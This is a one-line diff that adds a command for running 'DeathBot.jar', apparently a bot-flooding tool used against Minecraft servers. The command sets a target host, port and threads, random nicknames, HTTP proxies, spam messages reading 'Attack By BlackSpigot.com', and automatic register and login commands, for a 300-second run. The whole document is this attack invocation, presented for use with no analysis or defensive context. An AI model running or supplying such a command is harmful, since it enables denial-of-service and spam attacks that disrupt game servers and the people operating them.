@@ -1,0 +1,1 @@
+java -jar DeathBot.jar -move true -ping false -pingamount 10 -host <IP> -port <PORT> -threads <THREADS> -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol 47 -msg 'Attack By BlackSpigot.com' -amount 10 -proxymode HTTP -login '/login rodiontest123 ' -register '/register rodiontest123 rodiontest123 ' -time 300 -debug true
